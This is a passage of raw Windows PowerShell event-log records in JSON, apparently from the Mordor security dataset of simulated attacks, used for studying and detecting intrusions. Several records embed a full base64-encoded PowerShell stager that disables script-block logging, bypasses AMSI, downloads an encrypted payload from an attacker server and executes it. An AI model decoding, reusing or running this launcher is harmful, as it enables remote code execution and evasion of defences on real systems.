AAJAA1ADUAZgAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAVABFAE0ALgBUAGUAWABUAC4ARQBuAGMATwBEAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQBUAGUAUwAoACcAawApAGcASgAlAHgAMQBeAFMARABVAEcAIQB1AEsAbQA/AEwAdgAqAGIAZQBbAC0AbwBpAHkALwA0AHcAVAB8ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQANQA1AGYALgBIAEUAYQBkAEUAcgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAVgB4AGoAQgBwAEUAdQA9ADUARQBqAEUASQAwAGwARQA1AFcAWAAwAFAAdABSAGEARAAvAEEASwA1AFIATwBQAFYAeABVAD0AIgApADsAJABEAEEAVABBAD0AJAA1ADUAZgAuAEQAbwB3AE4ATABvAEEARABEAGEAVABBACgAJABzAGUAUgArACQAVAApADsAJABJAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAGQAQQB0AGEAPQAkAEQAQQBUAEEAWwA0AC4ALgAkAEQAQQB0AGEALgBsAEUATgBHAHQASABdADsALQBqAE8ASQBuAFsAQwBIAEEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\\r\\n        Engine Version = 5.1.18362.752\\r\\n        Runspace ID = 7c68447b-1740-4e09-9a80-6b8d20ac5a84\\r\\n        Pipeline ID = 1\\r\\n        Command Name = ForEach-Object\\r\\n        Command Type = Cmdlet\\r\\n        Script Name = \\r\\n        Command Path = \\r\\n        Sequence Number = 22714\\r\\n        User = THESHIRE\\\\pgustavo\\r\\n        Connected User = \\r\\n        Shell ID = Microsoft.PowerShell\\r\\n\\r\\n\\r\\nUser Data:\\r\\n\\r\\n\",\"Category\":\"Executing Pipeline\",\"Opcode\":\"To be used when operation is just executing a method\",\"SourceModuleName\":\"eventlog\",\"EventReceivedTime\":\"2020-08-07 10:42:10\",\"port\":60122,\"AccountName\":\"pgustavo\",\"ContextInfo\":\"        Severity = Informational\\r\\n        Host Name = ConsoleHost\\r\\n        Host Version = 5.1.18362.752\\r\\n        Host ID = bd39a342-b84b-499d-b35a-752ceae5484c\\r\\n        Host Application = C:\\\\windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAUwBpAE8ATgBUAGEAYgBsAEUALgBQAFMAVgBlAHIAcwBpAE8ATgAuAE0AYQBKAE8AcgAgAC0AZwBFACAAMwApAHsAJAA5ADMAOQA9AFsAUgBFAGYAXQAuAEEAUwBzAEUAbQBiAGwAeQAuAEcAZQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJAA5ADMAOQApAHsAJAA3ADkAMAA9ACQAOQAzADkALgBHAGUAVABWAEEATABVAGUAKAAkAE4AdQBMAEwAKQA7AEkARgAoACQANwA5ADAAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8AbABMAEUAQwB0AGkAbwBOAFMALgBHAEUATgBlAHIASQBjAC4ARABJAEMAdABJAE8AbgBBAHIAWQBbAHMAdAByAEkAbgBnACwAUwBZAFMAdABFAE0ALgBPAEIAagBlAEMAdABdAF0AOgA6AG4AZQB3ACgAKQA7ACQAdgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBhAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAA3ADkAMABbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABTAGUAewBbAFMAQwByAEkAUAB0AEIATABvAGMASwBdAC4AIgBHAGUAdABGAEkAZQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAdQBFACgAJABOAFUATABMACwAKABOAGUAdwAtAE8AQgBKAGUAQwB0ACAAQwBPAEwAbABlAGMAVABpAE8ATgBTAC4ARwBlAG4AZQBSAGkAYwAuAEgAQQBzAEgAUwBFAHQAWwBTAFQAcgBJAG4ARwBdACkAKQB9ACQAUgBFAEYAPQBbAFIAZQBmAF0ALgBBAFMAcwBFAE0AYgBMAFkALgBHAGUAdABUAHkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQAnACsAJwBVAHQAaQBsAHMAJwApADsAJABSAGUARgAuAEcAZQBUAEYASQBlAEwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAJwArACcAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAGwAVQBlACgAJABuAHUATABsACwAJAB0AHIAdQBFACkAOwB9ADsAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AUwBlAFIAVgBpAEMARQBQAG8AaQBuAFQATQBhAE4AQQBnAGUAUgBdADoAOgBFAHgAcABlAGMAdAAxADAAMABDAG8ATgBUAEkAbgB1AGUAPQAwADsAJAA1ADUARgA9AE4ARQB3AC0ATwBCAEoARQBjAFQAIABTAFkAcwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAEkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAFQALgBFAG4AQwBPAGQASQBuAGcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVABSAEkATgBHACgAWwBDAE8AbgB2AEUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAFMARQA2ADQAUwBUAFIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADUAZgAuAEgARQBBAEQARQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUANQBGAC4AUABSAE8AeABZAD0AWwBTAHkAUwB0AEUATQAuAE4AZQBUAC4AVwBFAGIAUgBlAFEAdQBFAFMAVABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBPAFgAWQA7ACQANQA1AEYALgBQAFIATwBYAFkALgBDAFIARQBkAEUAbgB0AEkAQQBsAFMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4AZQBUAC4AQwBSAEUAZABFAG4AdABJAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAEYAYQB1AGwAVABOAGUAdAB3AG8AUgBLAEMAUgBFAGQAZQBuAFQASQBBAGwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADUAZgAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAVABFAE0ALgBUAGUAWABUAC4ARQBuAGMATwBEAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQBUAGUAUwAoACcAawApAGcASgAlAHgAMQBeAFMARABVAEcAIQB1AEsAbQA/AEwAdgAqAGIAZQBbAC0AbwBpAHkALwA0AHcAVAB8ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQANQA1AGYALgBIAEUAYQBkAEUAcgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAVgB4AGoAQgBwAEUAdQA9ADUARQBqAEUASQAwAGwARQA1AFcAWAAwAFAAdABSAGEARAAvAEEASwA1AFIATwBQAFYAeABVAD0AIgApADsAJABEAEEAVABBAD0AJAA1ADUAZgAuAEQAbwB3AE4ATABvAEEARABEAGEAVABBACgAJABzAGUAUgArACQAVAApADsAJABJAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAGQAQQB0AGEAPQAkAEQAQQBUAEEAWwA0AC4ALgAkAEQAQQB0AGEALgBsAEUATgBHAHQASABdADsALQBqAE8ASQBuAFsAQwBIAEEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\\r\\n        Engine Version = 5.1.18362.752\\r\\n        Runspace ID = 7c68447b-1740-4e09-9a80-6b8d20ac5a84\\r\\n        Pipeline ID = 1\\r\\n        Command Name = ForEach-Object\\r\\n        Command Type = Cmdlet\\r\\n        Script Name = \\r\\n        Command Path = \\r\\n        Sequence Number = 22714\\r\\n        User = THESHIRE\\\\pgustavo\\r\\n        Connected User = \\r\\n        Shell ID = Microsoft.PowerShell\\r\\n\",\"Payload\":\"CommandInvocation(ForEach-Object): \\\"ForEach-Object\\\"\\r\\nParameterBinding(ForEach-Object): name=\\\"Process\\\"; value=\\\"$55f.Headers.Add($_.Name, $_.Value)\\\"\\r\\n\",\"Domain\":\"THESHIRE\",\"ExecutionProcessID\":1648,\"host\":\"wec.internal.cloudapp.net\",\"Severity\":\"INFO\",\"ActivityID\":\"{22CB5860-CC22-0000-E0F1-358A906BD601}\",\"SeverityValue\":2,\"EventID\":4103,\"UserID\":\"S-1-5-21-1363495622-3806888128-621328882-1104\",\"ProviderGuid\":\"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\",\"RecordNumber\":13442,\"SourceModuleType\":\"im_msvistalog\",\"Keywords\":0,\"tags\":[\"mordorDataset\"]}",
              "{\"@version\":\"1\",\"EventType\":\"INFO\",\"Version\":1,\"ThreadID\":4716,\"EventTime\":\"2020-08-07 10:42:08\",\"Task\":106,\"AccountType\":\"User\",\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"SourceName\":\"Microsoft-Windows-PowerShell\",\"OpcodeValue\":20,\"Hostname\":\"WORKSTATION5.theshire.local\",\"@timestamp\":\"2020-08-07T14:42:10.190Z\",\"Message\":\"CommandInvocation(Get-Random): \\\"Get-Random\\\"\\r\\nParameterBinding(Get-Random): name=\\\"InputObject\\\"; value=\\\"/admin/get.php\\\"\\r\\nParameterBinding(Get-Random): name=\\\"InputObject\\\"; value=\\\"/news.php\\\"\\r\\nParameterBinding(Get-Random): name=\\\"InputObject\\\"; value=\\\"/login/process.php\\\"\\r\\n\\r\\n\\r\\nContext:\\r\\n        Severity = Informational\\r\\n        Host Name = ConsoleHost\\r\\n        Host Version = 5.1.18362.752\\r\\n        Host ID = bd39a342-b84b-499d-b35a-752ceae5484c\\r\\n        Host Application = C:\\\\windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAUwBpAE8ATgBUAGEAYgBsAEUALgBQAFMAVgBlAHIAcwBpAE8ATgAuAE0AYQBKAE8AcgAgAC0AZwBFACAAMwApAHsAJAA5ADMAOQA9AFsAUgBFAGYAXQAuAEEAUwBzAEUAbQBiAGwAeQAuAEcAZQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJAA5ADMAOQApAHsAJAA3ADkAMAA9ACQAOQAzADkALgBHAGUAVABWAEEATABVAGUAKAAkAE4AdQBMAEwAKQA7AEkARgAoACQANwA5ADAAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8AbABMAEUAQwB0AGkAbwBOAFMALgBHAEUATgBlAHIASQBjAC4ARABJAEMAdABJAE8AbgBBAHIAWQBbAHMAdAByAEkAbgBnACwAUwBZAFMAdABFAE0ALgBPAEIAagBlAEMAdABdAF0AOgA6AG4AZQB3ACgAKQA7ACQAdgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBhAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAA3ADkAMABbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABTAGUAewBbAFMAQwByAEkAUAB0AEIATABvAGMASwBdAC4AIgBHAGUAdABGAEkAZQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAdQBFACgAJABOAFUATABMACwAKABOAGUAdwAtAE8AQgBKAGUAQwB0ACAAQwBPAEwAbABlAGMAVABpAE8ATgBTAC4ARwBlAG4AZQBSAGkAYwAuAEgAQQBzAEgAUwBFAHQAWwBTAFQAcgBJAG4ARwBdACkAKQB9ACQAUgBFAEYAPQBbAFIAZQBmAF0ALgBBAFMAcwBFAE0AYgBMAFkALgBHAGUAdABUAHkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQAnACsAJwBVAHQAaQBsAHMAJwApADsAJABSAGUARgAuAEcAZQBUAEYASQBlAEwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAJwArACcAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAGwAVQBlACgAJABuAHUATABsACwAJAB0AHIAdQBFACkAOwB9ADsAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AUwBlAFIAVgBpAEMARQBQAG8AaQBuAFQATQBhAE4AQQBnAGUAUgBdADoAOgBFAHgAcABlAGMAdAAxADAAMABDAG8ATgBUAEkAbgB1AGUAPQAwADsAJAA1ADUARgA9AE4ARQB3AC0ATwBCAEoARQBjAFQAIABTAFkAcwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAEkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAFQALgBFAG4AQwBPAGQASQBuAGcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVABSAEkATgBHACgAWwBDAE8AbgB2AEUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAFMARQA2ADQAUwBUAFIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADUAZgAuAEgARQBBAEQARQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUANQBGAC4AUABSAE8AeABZAD0AWwBTAHkAUwB0AEUATQAuAE4AZQBUAC4AVwBFAGIAUgBlAFEAdQBFAFMAVABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBPAFgAWQA7ACQANQA1AEYALgBQAFIATwBYAFkALgBDAFIARQBkAEUAbgB0AEkAQQBsAFMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4AZQBUAC4AQwBSAEUAZABFAG4AdABJAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAEYAYQB1AGwAVABOAGUAdAB3AG8AUgBLAEMAUgBFAGQAZQBuAFQASQBBAGwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADUAZgAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAVABFAE0ALgBUAGUAWABUAC4ARQBuAGMATwBEAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQBUAGUAUwAoACcAawApAGcASgAlAHgAMQBeAFMARABVAEcAIQB1AEsAbQA/AEwAdgAqAGIAZQBbAC0AbwBpAHkALwA0AHcAVAB8ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQANQA1AGYALgBIAEUAYQBkAEUAcgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAVgB4AGoAQgBwAEUAdQA9ADUARQBqAEUASQAwAGwARQA1AFcAWAAwAFAAdABSAGEARAAvAEEASwA1AFIATwBQAFYAeABVAD0AIgApADsAJABEAEEAVABBAD0AJAA1ADUAZgAuAEQAbwB3AE4ATABvAEEARABEAGEAVABBACgAJABzAGUAUgArACQAVAApADsAJABJAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAGQAQQB0AGEAPQAkAEQAQQBUAEEAWwA0AC4ALgAkAEQAQQB0AGEALgBsAEUATgBHAHQASABdADsALQBqAE8ASQBuAFsAQwBIAEEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\\r\\n        Engine Version = 5.1.18362.752\\r\\n        Runspace ID = 7c68447b-1740-4e09-9a80-6b8d20ac5a84\\r\\n        Pipeline ID = 1\\r\\n        Command Name = Get-Random\\r\\n        Command Type = Cmdlet\\r\\n        Script Name = \\r\\n        Command Path = \\r\\n        Sequence Number = 22716\\r\\n        User = THESHIRE\\\\pgustavo\\r\\n        Connected User = \\r\\n        Shell ID = Microsoft.PowerShell\\r\\n\\r\\n\\r\\nUser Data:\\r\\n\\r\\n\",\"Category\":\"Executing Pipeline\",\"Opcode\":\"To be used when operation is just executing a method\",\"SourceModuleName\":\"eventlog\",\"EventReceivedTime\":\"2020-08-07 10:42:10\",\"port\":60122,\"AccountName\":\"pgustavo\",\"ContextInfo\":\"        Severity = Informational\\r\\n        Host Name = ConsoleHost\\r\\n        Host Version = 5.1.18362.752\\r\\n        Host ID = bd39a342-b84b-499d-b35a-752ceae5484c\\r\\n        Host Application = C:\\\\windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAUwBpAE8ATgBUAGEAYgBsAEUALgBQAFMAVgBlAHIAcwBpAE8ATgAuAE0AYQBKAE8AcgAgAC0AZwBFACAAMwApAHsAJAA5ADMAOQA9AFsAUgBFAGYAXQAuAEEAUwBzAEUAbQBiAGwAeQAuAEcAZQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJAA5ADMAOQApAHsAJAA3ADkAMAA9ACQAOQAzADkALgBHAGUAVABWAEEATABVAGUAKAAkAE4AdQBMAEwAKQA7AEkARgAoACQANwA5ADAAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8AbABMAEUAQwB0AGkAbwBOAFMALgBHAEUATgBlAHIASQBjAC4ARABJAEMAdABJAE8AbgBBAHIAWQBbAHMAdAByAEkAbgBnACwAUwBZAFMAdABFAE0ALgBPAEIAagBlAEMAdABdAF0AOgA6AG4AZQB3ACgAKQA7ACQAdgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBhAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAA3ADkAMABbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABTAGUAewBbAFMAQwByAEkAUAB0AEIATABvAGMASwBdAC4AIgBHAGUAdABGAEkAZQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAdQBFACgAJABOAFUATABMACwAKABOAGUAdwAtAE8AQgBKAGUAQwB0ACAAQwBPAEwAbABlAGMAVABpAE8ATgBTAC4ARwBlAG4AZQBSAGkAYwAuAEgAQQBzAEgAUwBFAHQAWwBTAFQAcgBJAG4ARwBdACkAKQB9ACQAUgBFAEYAPQBbAFIAZQBmAF0ALgBBAFMAcwBFAE0AYgBMAFkALgBHAGUAdABUAHkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQAnACsAJwBVAHQAaQBsAHMAJwApADsAJABSAGUARgAuAEcAZQBUAEYASQBlAEwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAJwArACcAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMA